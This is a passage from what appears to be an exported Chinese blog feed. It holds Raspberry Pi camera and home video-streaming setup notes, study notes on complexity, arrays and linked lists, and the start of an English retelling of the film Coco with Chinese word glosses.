--awbgains : 设置AWB阈值， AWB模式必须关闭 --drc, --drc : 设置DRC水平 预览参数与命令 -p, --preview : 预览窗口大小设置 -f, --fullscreen : 全屏幕预览模式 -op, --opacity : 预览窗口透明度 （0-255） -n, --nopreview : 不显示预览窗口 -gs, -glscene : GL屏幕尺寸等参数 -gw, -glwin : GL窗口参数 曝光模式选项 auto : 自动曝光模式 night : 夜间拍摄模式 nightpreview : 夜间预览拍摄模式 backlight : 逆光拍摄模式 spotlight : 聚光灯拍摄模式 sports : 运动拍摄模式 snow : 雪景拍摄模式 beach : 海滩拍摄模式 verylong : 长时间曝光拍摄模式 fixedfps : 帧约束拍摄模式 antishake : 防抖模式 fireworks : 烟火拍摄模式 自动白平衡选项 off : 关闭白平衡测算 auto : 自动模式（默认） sun : 日光模式 cloud : 多云模式 shade : 阴影模式 tungsten : 钨灯模式 fluorescent : 荧光灯模式 incandescent : 白炽灯模式 flash : 闪光模式 horizon : 地平线模式 图像特效选项 none : 无特效（默认） negative : 反色图像 solarise : 曝光过度图像 posterize : 色调图像 whiteboard : 白板特效 blackboard : 黑板特效 sketch : 素描风格特效 denoise : 降噪图像 emboss : 浮雕图像 oilpaint : 油画风格特效 hatch : 草图特效 gpen : 马克笔特效 pastel : 柔化风格特效 watercolour : 水彩风格特效 film : 胶片颗粒风格特效 blur : 模糊图像 saturation : 色彩饱和图像 colourswap : 暂未可用 washedout : 暂未可用 posterise : 暂未可用 colourpoint : 暂未可用 colourbalance : 暂未可用 cartoon : 暂未可用 测光模式选项 average : 全画面平衡测光 spot : 点测光 backlit : 模拟背光图像 matrix : 阵列测光 使用motion搭建视频监控系统motion是Linux下一款轻量级的视频监控软件，motion可以提供网络摄像头的功能，当拍摄过程中画面发生变动时，Motion可以保存动作发生时的图片和视频，这时如果将抓拍的图片或视频上传到百度云或者DropBox中就可以实现一个简单的监控系统。具体实现如下： 安装motion $sudo apt-get install motion 配置motion选项时，先对配置文件进行备份 $sudo cp /etc/motion/motion.conf /etc/motion/motion.conf.bak 修改/etc/motion/motion.conf选项 $sudo vim /etc/motion/motion.conf daemon on #开启守护进程（选配） target_dir /home/pi/motion-images #文件保存的路径，图像变化时图片保存的路径 stream_localhost off #允许通过网页查看摄像 值得注意的是target_dir选项，默认值为/var/lib/motion。这是motion存储文件的目标文件夹。所存储文件包括了运动捕捉产生的图片或视频。用户motion必须对该目标文件夹有写入权限。这里我们将默认的文件目标进行了修改。同时注意，流媒体的默认端口是8081，这里后面会使用到。 最后，在设置文件中，默认的视频设备（videodevice项）是/dev/video0。如果你连接好了摄像头，却无法在/dev下找到video0，那么可以尝试加载V4L2驱动： sudo rpi-updatesudo modprobe bcm2835-v4l2 #加载驱动模块这样每次启动都要重新加载v4l2驱动，如果你希望开机就加载v4l2驱动可以在/etc/modules文件中加入bcm2835-v4l2，这样每次开机就可以直接加载v4l2驱动模块。 修改/etc/default/motion，更改守护进程的设置： start_motion_daemon=yes然后，启动motion sudo motion在同一局域网下的其他电脑上，用浏览器打开192.168.23.122:8081，可以直接看到即时拍摄的流媒体： 动作捕捉的图片和视频将存储在目录/home/pi/motion-images下。如果想改变动作捕捉的相关参数，例如动作捕捉的敏感度等，可以在/etc/motion/motion.conf中修改,这里需要参考具体motion的使用。 当拍摄过程中画面发生变动时，Motion可以保存动作发生时的图片和视频 参数Motion - Config File Options汉化参数参考 DIY网页端的树莓派流畅监控，官方CSI摄像头的正确用法参考连接： https://blog.csdn.net/NCTU_to_prove_safety/article/details/68928496 先安装依赖： apt-get install libjpeg8-dev cmake 今天的主角 —— 别人的Github 先在树莓派上下载其软件： wget https://github.com/jacksonliam/mjpg-streamer/archive/master.zip # unzip master.zip #解压~ # cd mjpg-streamer-master/mjpg-streamer-experimental # vim plugins/input_raspicam/input_raspicam.c #编辑该文件，没有vim就用别的 进去以后，搜索fps，也就是按一下/键，然后输入fps，然后回车 然后保存退出编辑器后，编译： # make clean all 写个脚本假设刚才mjpg-streamer-master文件夹就在/test目录。 回到自己的目录，编写脚本： 1234# cd# vim start_web_video.sh 复制以下两句： cd /test/mjpg-streamer-master/mjpg-streamer-experimental ./mjpg_streamer -i &quot;./input_raspicam.so&quot; -o &quot;./output_http.so -w ./www&quot; 保存退出，给予权限： # chmod +x start_web_video.sh 运行./start_web_video.sh 用浏览器访问在你的电脑的浏览器访问 http://你树莓派的ip:8080]]></content>
      <categories>
        <category>树莓派</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据结构与算法之美]]></title>
    <url>%2F%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E4%B9%8B%E7%BE%8E%2F</url>
    <content type="text"><![CDATA[笔记整理 1.学习技巧–王争 边学边练，适度刷题 多问、多思考、多互动 打怪升级学习法比如，针对这个专栏，你就可以设立这样一个目标：每节课后的思考… 知识需要沉淀，不要想试图一下子掌握所有学习知识的过程是反复迭代、不断沉淀的过程，书读百遍其义自见。 2.时间复杂度思考3.空间复杂度思考总结一、什么是复杂度分析？1.数据结构和算法解决是“如何让计算机更快时间、更省空间的解决问题”。2.因此需从执行时间和占用空间两个维度来评估数据结构和算法的性能。3.分别用时间复杂度和空间复杂度两个概念来描述性能问题，二者统称为复杂度。4.复杂度描述的是算法执行时间（或占用空间）与数据规模的增长关系。 二、为什么要进行复杂度分析？1.和性能测试相比，复杂度分析有不依赖执行环境、成本低、效率高、易操作、指导性强的特点。2.掌握复杂度分析，将能编写出性能更优的代码，有利于降低系统开发和维护成本。 三、如何进行复杂度分析？1.大O表示法1）来源算法的执行时间与每行代码的执行次数成正比，用T(n) = O(f(n))表示，其中T(n)表示算法执行总时间，f(n)表示每行代码执行总次数，而n往往表示数据的规模。2）特点以时间复杂度为例，由于时间复杂度描述的是算法执行时间与数据规模的增长变化趋势，所以常量阶、低阶以及系数实际上对这种增长趋势不产决定性影响，所以在做时间复杂度分析时忽略这些项。 2.复杂度分析法则1）单段代码看高频：比如循环。2）多段代码取最大：比如一段代码中有单循环和多重循环，那么取多重循环的复杂度。3）嵌套代码求乘积：比如递归、多重循环等4）多个规模求加法：比如方法有两个参数控制两个循环的次数，那么这时就取二者复杂度相加。 四、常用的复杂度级别？多项式阶：随着数据规模的增长，算法的执行时间和空间占用，按照多项式的比例增长。包括，O(1)（常数阶）、O(logn)（对数阶）、O(n)（线性阶）、O(nlogn)（线性对数阶）、O(n^2)（平方阶）、O(n^3)（立方阶）非多项式阶：随着数据规模的增长，算法的执行时间和空间占用暴增，这类算法性能极差。包括，O(2^n)（指数阶）、O(n!)（阶乘阶） 五、如何掌握好复杂度分析方法？复杂度分析关键在于多练，所谓孰能生巧。 4.数据结构与算法思考算法就是操作数据的一组方法。数据结构就是一组数据的存储结构。二者关系：数据结构是为算法服务的，算法要作用于特定的数据结构之上。数据结构是静态的，必须基于它操作和构建算法，数据结构才有意义。 数据结构三要素：数据逻辑结构、数据存储结构和数据的运算。 从广义和狭义两个层面理解数据结构与算法 1.广义：数据结构是指一组数据的存储结构。算法是操作数据的一组方法 图书馆找书的例子 2.狭义：指出专栏主要讲解著名的数据结构和算法，队列，栈，二分查找，动态规划等。经典的算法可以高效的帮我们解决实际开发问题 3.为什么数据结构和算法会放到一起？ 数据结构是为算法服务的，算法要作用在特定的数据结构之上。数据结构是静态的，它只是组指数据的一种方式。如果不在它的基础上操作，构建算法，孤立存在的数据结构就没有用。 复杂度就是用来分析算法执行效率与数据规模之间增长关系。 性能测试与复杂度分析不冲突，原因如下：1、性能测试是依附于具体的环境，如SIT、UAT机器配置及实例数量不一致结果也有差别。2、复杂度分析是独立于环境的，可以大致估算出程序所执行的效率。3、将复杂度熟记于心，能够写出更高效率、更好性能的代码。若某接口通过性能测试，达不到预期，还可以用复杂度分析接口代码，找出最影响性能的代码，进行优化。 每段代码都分析一下时间复杂度、空间复杂度，是不是很浪费时间呢？这个问题分两种情况讨论1、开发过程中，码代码的过程中就能得出其复杂度，这并不会太多的浪费时间，同时只有分析了每段代码的复杂度，才能估算出它们的执行效率。2、优化代码时，只有在分析每段代码的复杂度后，才能定位问题代码，才能做相应优化 05、为什么数组要从 0 开始编号，而不是从 1 开始呢？1、数组（Array）：是一种线性表数据结构。它用一组连续的内存空间，来存储一组具有相同类型的数据。 2、线性表（Linear List）：顾名思义，线性表就是数据排成像一条线一样的结构。每个线性表上的数据最多只有前和后两个方向。其实除了数组，链表、队列、栈等也是线性表结构。 3、非线性表：比如二叉树、堆、图等。之所以叫非线性，是因为，在非线性表中，数据之间并不是简单的前后关系。 4、连续的内存空间和相同类型的数据：这两个限制也让数组的很多操作变得非常低效，比如要想在数组中删除、插入一个数据，为了保证连续性，就需要做大量的数据搬移工作。当计算机需要随机访问数组中的某个元素时，它会首先通过下面的寻址公式，计算出该元素存储的内存地址：a[i]_address = base_address + i * data_type_size 5、删除操作：记录下已经被删除的数据，每次的删除操作并不是搬移数据，只是记录数据已经被删除，当数组没有更多的存储空间时，再触发一次真正的删除操作。即JVM标记清除垃圾回收算法。 6、警惕数组的访问越界问题：关于数组越界访问导致死循环的问题，我也动手实践了一下，发现结果和编译器的实现有关，gcc有一个编译选项（-fno-stack-protector）用于关闭堆栈保护功能。默认情况下启动了堆栈保护，不管i声明在前还是在后，i都会在数组之后压栈，只会循环4次；如果关闭堆栈保护功能，则会出现死循环。请参考：https://www.ibm.com/developerworks/cn/linux/l-cn-gccstack/index.html 7、容器能否完全替代数组？相比于数组，Java中的ArrayList封装了数组的很多操作，并支持动态扩容。扩容时比较消耗内存，因为涉及到内存申请和数据搬移。数组适合的场景：Java ArrayList的使用涉及装箱拆箱，有一定的性能损耗，关注性能，或者希望使用基本类型，就可以选用数组；数据大小事先已知，并且涉及的数据操作非常简单，使用数组；表示多维数组时，数组往往更加直观；业务开发容器即可，底层开发，如网络框架，性能优化。选择数组。 8、标记清除垃圾回收算法：大多数主流虚拟机采用可达性分析算法来判断对象是否存活，在标记阶段，会遍历所有 GC ROOTS，将所有 GC ROOTS 可达的对象标记为存活。只有当标记工作完成后，清理工作才会开始。不足：1.效率问题。标记和清理效率都不高，但是当知道只有少量垃圾产生时会很高效。2.空间问题。会产生不连续的内存空间碎片。 9、二维数组的内存寻址公式是怎样的呢？对于 m n 的二维数组，a [ i ][ j ] (i &lt; m,j &lt; n) 的地址为：address = base_address + ( i n + j) * type_size 10、三维数组：三维数组假设是 mnq， a[i][j][k]_address=base_address + (inq + jq + k)type_size 06 链表1、学习链表有什么用？一、基于链表实现 LRU 缓存淘汰算法：我们维护一个有序单链表，越靠近链表尾部的结点是越早之前访问的。当有一个新的数据被访问时，我们从链表头开始顺序遍历链表。 1、如果此数据之前已经被缓存在链表中了，我们遍历得到这个数据对应的结点，并将其从原来的位置删除，然后再插入到链表的头部。 2、如果此数据没有在缓存链表中，又可以分为两种情况： 如果此时缓存未满，则将此结点直接插入到链表的头部； 如果此时缓存已满，则链表尾结点删除，将新的数据结点插入链表的头部。 二、2.如何通过单链表实现“判断某个字符串是否为水仙花字符串”？1）前提：字符串以单个字符的形式存储在单链表中。2）遍历链表，判断字符个数是否为奇数，若为偶数，则不是。3）将链表中的字符倒序存储一份在另一个链表中。4）同步遍历2个链表，比较对应的字符是否相等，若相等，则是水仙花字串，否则，不是。 2、什么是链表1.和数组一样，链表也是一种线性表。2.从内存结构来看，链表的内存结构是不连续的内存空间，是将一组零散的内存块串联起来，从而进行数据存储的数据结构。3.链表中的每一个内存块被称为节点Node。节点除了存储数据外，还需记录链上下一个节点的地址，即后继指针next。 3、为什么使用链表？1.插入、删除数据效率高O(1)级别（只需更改指针指向即可），随机访问效率低O(n)级别（需要从链头至链尾进行遍历）。2.和数组相比，内存空间消耗更大，因为每个存储数据的节点都需要额外的空间存储后继指针。 4、常用链表单链表、循环链表、双向链表 5、数组与链表的比较 1.插入、删除和随机访问的时间复杂度数组：插入、删除的时间复杂度是O(n)，随机访问的时间复杂度是O(1)。链表：插入、删除的时间复杂度是O(1)，随机访问的时间复杂端是O(n)。链表增删快但是查询比较慢。2.数组缺点1）若申请内存空间很大，比如100M，但若内存空间没有100M的连续空间时，则会申请失败，尽管内存可用空间超过100M。2）大小固定，若存储空间不足，需进行扩容，一旦扩容就要进行数据复制，而这时非常费时的。3.链表缺点1）内存空间消耗更大，因为需要额外的空间存储指针信息。2）对链表进行频繁的插入和删除操作，会导致频繁的内存申请和释放，容易造成内存碎片，如果是Java语言，还可能会造成频繁的GC（自动垃圾回收器）操作。4.如何选择？数组简单易用，在实现上使用连续的内存空间，可以借助CPU的缓冲机制预读数组中的数据，所以访问效率更高，而链表在内存中并不是连续存储，所以对CPU缓存不友好，没办法预读。如果代码对内存的使用非常苛刻，那数组就更适合。 6、缓存：是一种提高数据读取性能的技术，在硬件设计、软件开发中都有着非常广泛的应用，比如常见的 CPU 缓存、数据库缓存、浏览器缓存等等。 7、小结和数组相比，链表更适合插入、删除操作频繁的场景，查询的时间复杂度较高。不过，在具体软件开发中，要对数组和链表的各种性能进行对比，综合来选择使用两者中的哪一个。 8、问题：如何判断一个字符串是否是回文字符串的问题，我想你应该听过，我们今天的思题目就是基于这个问题的改造版本。如果字符串是通过单链表来存储的，那该如何来判断是一个回文串呢？你有什么好的解决思路呢？相应的时间空间复杂度又是多少呢？ 07链表总结这节我主要和你讲了写出正确链表代码的六个技巧。分别是理解指针或引用的含义、警惕指针丢失和内存泄漏、利用哨兵简化实现难度、重点留意边界条件处理，以及举例画图、辅助思考，还有多写多练。 练习题LeetCode对应编号：206，141，21，19，876。参考（C#）：https://www.cnblogs.com/errornull/p/9860724.html 1、指针或引用的含义指针是一个变量，该变量中存的是其它变量的地址。将普通变量赋值给指针变量，其实是把它的地址赋值给指针变量。 2、指针丢失和内存泄漏在插入和删除结点时，要注意先持有后面的结点再操作，否者一旦后面结点的前继指针被断开，就无法再访问，导致内存泄漏。 3、利用哨兵简化难度链表的插入、删除操作，需要对插入第一个结点和删除最后一个节点做特殊处理。利用哨兵对象可以不用边界判断，链表的哨兵对象是只存指针不存数据的头结点。 4. 重点留意边界条件处理操作链表时要考虑链表为空、一个结点、两个结点、头结点、尾结点的情况。学习数据结构和算法主要是掌握一系列思想，能在其它的编码中也养成考虑边界的习惯。 5. 举例画图，辅助思考对于比较复杂的操作，可以用纸笔画一画，释放脑容量来做逻辑处理（时间换空间思想），也便于完成后的检查。 作业 单链表反转 链表中环的检测 两个有序的链表合并 删除链表倒数第 n 个结点 求链表的中间结点 用哨兵来简化编码实现，你是否还能够想到其他场景，利用哨兵可以大大地简化编码难度？]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>算法</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[寻梦环游记]]></title>
    <url>%2F%E5%AF%BB%E6%A2%A6%E7%8E%AF%E6%B8%B8%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[安装彩云小译浏览器插件 Chapter1Mamá Coco is the only person who truly understands Miguel. That’s why he loves spending time with her. “Hola (你好), Mamá Coco,” he says as he steps into his great-grandmother’s room. She’s in a wicker wheelchair with her shawl and furry slippers. Her skin is as wrinkled as a wadded paper bag and her face is framed by two white braids. “How are you, Julio?” she says. Mamá Coco is very old, and sometimes she gets confused. “Actually, my name is Miguel.” He leans forward so she can get a good look at him. She lost her teeth long ago, but that doesn’t stop her from smiling. “Heh, heh,” she chuckles as she reaches for his cheeks. Miguel tells her everything — how he likes to run with his hands open and palms flat because it’s faster; how he has a dimple on one side of his face but not on the other; who his favorite luchador (摔跤手) is. Mamá Coco nods and smiles, while the scraggly cat at the window yawns and stretches. When he runs out of things to say, Miguel starts humming absentmindedly as he straightens things around the room. He catches Mamá Coco’s foot moving, but he can’t tell if she’s trying to tap the rhythm or scratching an itch on her heel. Without realizing it, Miguel stops humming and starts to sing out loud. He can’t help it.The music just takes over. He’s about to hit a high note when his Abuelita (外祖母) storms in. “How many times do I have to tell you?” she says, pointing at him. “No music!” She startles the cat at the window, and it runs off. She startles Mamá Coco and Miguel, too. Noticing this, Abuelita softens a bit and comes over to give Mamá Coco, her mother, a kiss on the forehead. “Sorry I yelled,” she says, and turning to Miguel, she adds, “but you know the rule — no music.” Miguel does know the rule. He’s reminded every day. Once he blew into a glass soda bottle, and when Abuelita (外祖母) heard the whistle, she snatched the bottle away. Another time Miguel rushed to the window when he heard a truck with its radio blaring, but before he could catch the tune, Abuelita angrily slammed the window shut. A few nights before, a trio of gentlemen had serenaded as they strolled by the family hacienda, and instead of letting them fill the air with beautiful songs, Abuelita burst out the door and chased them off. “No music!” she’d shouted after them. picAnd here she is again, telling him about the ban on music. “I know the rule,” Miguel says, “but—” Abuelita (外祖母) shushes him. Then she sits on the edge of Mamá Coco’s bed and pats the space beside her so Miguel can sit, too. “Let me tell you why we have this rule,” she begins. Miguel sighs. He’s heard the story a million times. He can recite it by memory, and he says the words in his mind as Abuelita speaks. “A long time ago, there was a family. “A mamá, a papá, and their little girl. “The man, he was a musician. “He loved to play the guitar while his wife and daughter danced. “Every day, he and his wife would sing, dance, and count their blessings.” Abuelita (外祖母) pauses and takes a deep breath before going on. “But this man had a dream. “He wanted to play his music for the world. “And one day, that man left with his guitar . . . and never returned.” She shakes her head with shame, and her voice hardens a bit. “Now imagine a man holding a guitar and walking away as his poor wife and child stand in the doorway and watch. “But do you think that woman wasted one tear on that walk-away musician? No! ” Miguel decides to finish the story. “She banished all music from her life because she had a daughter to provide for,” he says, and Abuelita (外祖母) nods. “So she rolled up her sleeves and she learned to make shoes. “Then she taught her daughter to make shoes. “And later, she taught her son-in-law. “Then her grandkids got roped in. “As the business grew, so did her family.” Abuelita puts a hand on Miguel’s shoulder. “And who was that woman?” “My great-great-grandmother, Mamá Imelda.” “And the little girl?” “Mamá Coco,” Miguel answers, glancing at his great grandmother as she sits in the wheelchair, nearly asleep. Chapter2Abuelita (外祖母) gets up and adjusts the shawl on Mamá Coco’s shoulders. She beckons Miguel to follow her, and they tiptoe out, making their way to the ofrenda (灵坛) room. It’s set up as a memorial to their ancestors, with an altar decorated with embroidered cloth, flowers, and candles illuminating portraits of relatives who have passed away. In the flickering light, the portraits seem to move as if the ancestors were still alive. Abuelita (外祖母) lovingly adjusts a sepia-tinted photo of Mamá Imelda with baby Coco on her lap. A man stands beside her, but his face has been torn away. The only clue that this is the mysterious musician is a charro (骑手) jacket with fancy trim, the kind that mariachis (墨西哥流浪歌手) love to wear. “Come along,” Abuelita says, and she leads Miguel across the courtyard to the shoemaking shop. Cabinets along the walls hold trays of buckles, shoelaces, brackets, threads, and chisels. Half-finished shoes hang from clotheslines, and different-sized mallets are thrown about. The floor is scuffed from so many years of the Rivera family hard at work. Even now, they are busy making shoes. picMiguel’s papá and tía (阿姨) Gloria use rivet guns to make eyelets for shoelaces. His mother and grandfather run fabric through sewing machines. Tío (叔叔) Berto carves into leather with a swivel knife, and Tía (阿姨) Carmen traces patterns on a cutting board. It’s very noisy in the shop, but the tapping, punching, and sewing sound nothing like music to Miguel. Abuelita waves her hand across the room as if showing Miguel a grand kingdom. “Music tore our family apart, but shoes have held it together.” Then she giggles to herself. “In fact,” she says, “I captured the heart of your grandfather when he realized that I made the most beautiful and comfortable cowboy boots in all of Mexico.” “I never got blisters,” Papá Franco says. “No one gets blisters when they wear my shoes,” Abuelita (外祖母) proudly announces. “Okay, okay,” Miguel says. “Shoes. I get it.” He slips a red hoodie over his tank top, grabs a shoeshine box, and heads for the door. “Why don’t I make myself useful and go shine some boots in town?” “Be back by lunch, m’ijo (孩子) ,” his mamá says. “And don’t forget to use the brush on suede and the cloth on leather,” Abuelita reminds him. “Got it!” Miguel says, rushing to shine shoes like a proper Rivera boy. But, and this is the part he’s left out, he plans to shine shoes near the musicians in Mariachi Plaza! On his way to the plaza, Miguel says hello to a woman who is whistling as she sweeps her stoop. Then he passes a lone guitarist playing a classical piece with lots of tremolo (颤音) . Miguel nods with appreciation, and the man nods back. The closer Miguel gets to the plaza, the more music he hears and the happier he feels. Young girls sing while jumping rope, the slap on the sidewalk setting the tempo for their song. The church bells chime in harmony with a tune played by a street band, and when a radio blares a cumbia (坤比亚舞) rhythm, Miguel does a few crossover steps to the beat. He’s humming when he reaches a pan dulce (墨西哥甜点) booth and grabs his favorite type of sweet bread, the cochinito (小猪) , a gingerbread cookie shaped like a pig. “Muchas gracias (非常感谢) !” Miguel says as he tosses the vendor a coin. “De nada (不客气) , Miguel!” As he walks along, he feels something at his leg, and when he looks down, he sees the scraggly cat from Mamá Coco’s window. It scurries off, then glances back to see if Miguel is following. Where does that cat want me to go? he wonders. He shrugs and moves on to a street vendor at a booth full of alebrijes (墨西哥手工艺品) , colorful sculptures of fantastical creatures, like lizards with feathers, rabbits with horns, and giraffes with multicolored spots. Miguel stops a moment, tapping a rhythm on the table. He’s about to take a bite of pan dulce when a familiar street dog sidles up. The dog is nearly bald, with a few hairs sticking out here and there like thorns on a nopal (仙人掌) . He goofily licks his chops because he’s hungry. Miguel breaks off the rump of the cochinito (小猪) and holds it over the dog’s nose. “Want some of this?” he asks, laughing. “Roo, roo!” the dog answers. Miguel goes through the commands he has taught the dog. “Sit, roll over, shake.” The dog performs each trick perfectly. Miguel finishes with his favorite, “Fist bump,” and he laughs as the dog laps his long tongue against his closed hand. “Good boy, Dante!” Miguel drops the pan dulce, and Dante gobbles it up. Chapter3There’s a sense of celebration in the air because it’s the eve of Día de los Muertos (亡灵节) , the Day of the Dead, when the community honors loved ones who have passed away. The streets are lined with strings of papel picado (墨西哥剪纸) , squares of paper with punched-out designs, brightening the space with their pinks, greens, golds, and blues. Children reach for decorated sugar skulls. Some of the elderly, viejitos (老爷爷) and viejitas (老奶奶) , carry candles and vases filled with marigolds and mums for their ofrendas (灵坛) , while others rush to buy soda, candy, fruit, cigars, or toys to leave at the gravesites. Meanwhile, Miguel quickly makes his way to Mariachi Plaza with Dante at his side. They finally reach their destination, and the plaza lives up to its name, for it is crowded with musicians. They’re so lucky, thinks Miguel, to play guitars and trumpets without getting scolded. “I know I’m not supposed to like music,” Miguel tells Dante, “but it’s not my fault!” Miguel looks up and gazes at a statue of a handsome mariachi (墨西哥流浪歌手) . “It’s his: Ernesto de la Cruz, the greatest musician of all time.” At the base of the statue is a plaque with the musician’s most famous quote—SEIZE YOUR MOMENT. Just then a tour group makes its way to the statue, and Miguel eavesdrops as the tour guide tells them about the famous musician. “And right here in this very plaza,” the tour guide says, “the young Ernesto de la Cruz took his first steps toward becoming the most beloved singer in Mexican history.” As the guide speaks, Miguel imagines de la Cruz in his heyday, a young man in the plaza, swarmed by fans as he played his songs. He glances down at Dante and pets him. “De la Cruz,” Miguel says, “he was just . . . he was the guy, you know? “He started out a total nobody from Santa Cecilia, like me. “But when he played music, he made people fall in love with him.” Dante wags his tail. Miguel’s told this story a dozen times, and Dante always seems happy to hear it. “He traveled the world,” Miguel goes on. “He starred in movies. pic“Oh, plus he had the coolest guitar. “And he wrote the best songs! “But my all-time favorite? It’s—” Miguel closes his eyes and recalls an old clip of de la Cruz performing in a fancy nightclub. He can clearly hear de la Cruz’s voice singing his most famous song, “Remember Me.” It’s a song about being remembered forever—even after one is gone. And it has a very catchy tune. Miguel hums along with the memory. Then he looks up at the statue of Ernesto de la Cruz, awestruck by his greatness. “He lived the kind of life you dream about,” he continues, “until 1942 . . .” He can’t finish the sentence, because it breaks his heart to repeat what happened, but then he hears Dante panting and sees the goofy dog waiting for the end of the story. “Until 1942, when he was crushed by a giant bell.” Dante barks as if to say “the end.” Then he runs off, and Miguel remembers why he’s in the plaza. He’s supposed to shine shoes, so he finds a spot near the statue and takes out his shoeshine kit, using the box as a footstool for his customers. A few minutes later, a mariachi asks for a shoeshine and Miguel gets to work, the whole time repeating the tale of Ernesto de la Cruz. “Sometimes, I look at de la Cruz,” he says, “and I get this feeling . . . like we’re connected somehow. “Like, if he could play music, maybe someday I could, too.” Then, in a voice full of sadness, he continues, “If only it wasn’t for my family.” “Ay yai yai, muchacho (小男孩) !” the mariachi exclaims. “Huh?” Miguel says, confused, because for a moment, he’s forgotten where he is. “I asked for a shoeshine, not your life story,” the mariachi says. “Oh, yeah. Sorry.” Miguel goes back to buffing the man’s shoe. Meanwhile, the mariachi plucks at his guitar strings. “I just can’t talk about any of this at home,” Miguel explains. “Look,” the mariachi says, “if I were you? “I’d march right up to my family and say, ‘Hey! I’m a musician. Deal with it.’ ” Miguel shakes his head. “I could never say that.” “You are a musician, no?” Miguel desperately wants to say yes, but then he remembers his family’s past, how music tore them apart. “I don’t know,” he admits. “I mean . . . I only really play for myself—” “Aah!” The mariachi seems frustrated by Miguel’s lack of confidence. “Did de la Cruz become the world’s best musician by hiding his sweet, sweet skills?” He doesn’t let Miguel answer. “No!” the mariachi says, thumping his guitar for emphasis. “He walked out onto that plaza and he played out loud!” He points to the gazebo, where some men are setting up speakers and hanging a giant poster announcing a talent show. “Ah! Mira, mira (看)! They’re setting up for tonight. “The music competition for Día de los Muertos (亡灵节). “You wanna be like your hero? You should sign up!” Instead of excited, Miguel is shocked at the thought. “Huh-uh, my family would freak!” Chapter4“Look, if you’re too scared, then, well . . . have fun making shoes.” The mariachi (墨西哥流浪歌手) does a quick rasgueado (拨弦) on the guitar, and Miguel admires the way his fingers flutter over the strings. “But the world belongs to the bold, m’ijo (孩子) .” Miguel silently mouths the words as he considers this. “C’mon (来吧) ,” the mariachi urges. “What did de la Cruz always say?” “Seize your moment?” Miguel phrases it as a question even though he knows the answer by heart. The mariachi nods. Then he offers the guitar to Miguel. “Show me what you got, muchacho (小男孩) . “I’ll be your first audience.” Miguel’s eyes widen and his brows rise with surprise at this gesture. He aches to hold the guitar, but then he hears Abuelita (外祖母) proclaiming the family rule—No music allowed! Every time he dares to play something, her warning echoes in his head. But how can he resist a chance to touch a beautiful guitar? He glances around to make sure the coast is clear. Then he reaches for the instrument and takes it with reverence, as if holding a holy relic. Once it’s in his arms, Miguel presses the strings and is about to strum a C chord when he hears: “Miguel!” It’s Abuelita’s voice, and he laughs at himself. I must be paranoid, he thinks. But then he hears her voice again, this time much closer. He gasps and tosses the guitar back to the mariachi, but it’s too late. Abuelita, Tío (叔叔) Berto, and Prima (堂妹) Rosa, Miguel’s cousin, have found them. They march straight over, their arms full of bags and supplies. “Abuelita!” Miguel says. “What are you doing here?” she asks. “Um . . . uh . . .” Miguel quickly packs up his shoeshine equipment, hoping his grandmother ignores the mariachi. But she doesn’t. She grabs a chancla (拖鞋) from her purse. Many years ago, the strap on the sandal fell off, but since Abuelita (外祖母) hates to throw out shoes, no matter how tattered, she keeps it as a flyswatter. Apparently, it’s a mariachi swatter, too, because she barrels up to the man, hits him with the shoe, and waves him away just like she does with the flies. “You leave my grandson alone!” she shouts. “Doña (太太) , please. I was just getting a shine!” “I know your tricks, mariachi!” Then, turning to Miguel, she demands, “What did he say to you?” Miguel shrugs. “He was just showing me his guitar.” Abuelita gasps, Prima (堂妹) Rosa gasps, and Tío (叔叔) Berto gasps, too. “Shame on you!” the uncle says to the mariachi. Abuelita approaches the musician, chancla (拖鞋) aimed directly between his eyes. “My grandson,” she says, “is a sweet little angelito (小天使) querido (亲爱的) cielito (天使) . “He wants no part of your music, mariachi (墨西哥流浪歌手)! “You keep away from him!” She is a formidable woman, so the mariachi grabs his sombrero and scrambles away. Miguel can only watch with unspoken apologies and a heavy heart. There goes a man who let him talk about music without feeling ashamed. “Ay, pobrecito! (可怜的小家伙) ” Abuelita says, hugging Miguel so tight he can barely breathe. “Estás bien (你还好吗), m’ijo (孩子) ?” When she releases him, he gasps for air. “You know better than to be in this place! “You will come home. Now.” Miguel sighs, and as he picks up his shoeshine box, he notices a sheet of paper. It’s a flyer for the talent show—the one the mariachi told him about! Quickly, before Abuelita (外祖母) turns around, he pockets the flyer. As they walk through the plaza, Abuelita can’t stop commenting on everyone’s shoes. When she sees Señor (先生) Maldonado, she says, “Now there is an admirable man. “See how the patent leather of his loafers gleams in the sun?” When she sees Señora (女士) Diaz, she says, “I dyed those satin pumps myself, and look how they’re fading.” And to the señora (女士), she calls out, “Don’t store your shoes by the window! “They’re supposed to be red but now they’re turning pink from all that sun.” Señora (女士) Diaz gives her a thumbs-up and hurries away. And then Rosa spots a small boy and points at him. “Look, Abuelita!” Abuelita gasps. “His shoelaces!” Sure enough, the laces on the boy’s tennis shoes are frayed and too short to be tied into a proper knot. “Not his shoes,” Rosa says. “He’s crying!” “Of course he’s crying. “I would cry, too, if my shoelaces looked like that.” Abuelita (外祖母) stoops down to examine them. “What happened here?” she asks the boy, but instead of explaining what happened to his shoes, he says, “I’m lost.” Abuelita snaps to get Tío (叔叔) Berto’s attention. “Go find his parents,” she orders. “Yes, yes, right away,” Tío (叔叔) Berto says as he obediently rushes off. “We’ll find your parents,” Abuelita tells the boy. “In the meantime, you can’t go around with frayed laces. “Lucky for you, I have extras in my purse.” She pulls out three pairs of shoelaces, and the boy’s eyes widen with delight. “Which color do you want?” she asks, and he studies them as if choosing the right color is the most important decision of his life. Chapter5While Abuelita (外祖母) is busy with the boy, Miguel spots a paper airplane. It’s crumpled from being stepped on. Thinking he can smooth out the crumpled parts and give it to the boy, Miguel picks it up, but he only half-heartedly unfolds it because he can’t stop thinking about music. He really wants to perform. Except for Dante and Mamá Coco, no one’s ever heard him sing. They don’t want to hear him sing, because it’s against the family rules. But what if he won the talent show? Maybe . . . just maybe they would accept him as a real musician. He sighs, heavyhearted. Then he refolds the paper, making it a plane again, and throws it into the air. As it glides away, he thinks about his dreams. Will they glide away, too? He’s about to return to Abuelita (外祖母) when he hears clacking from around the corner. He sneaks over to investigate, Rosa following. When they 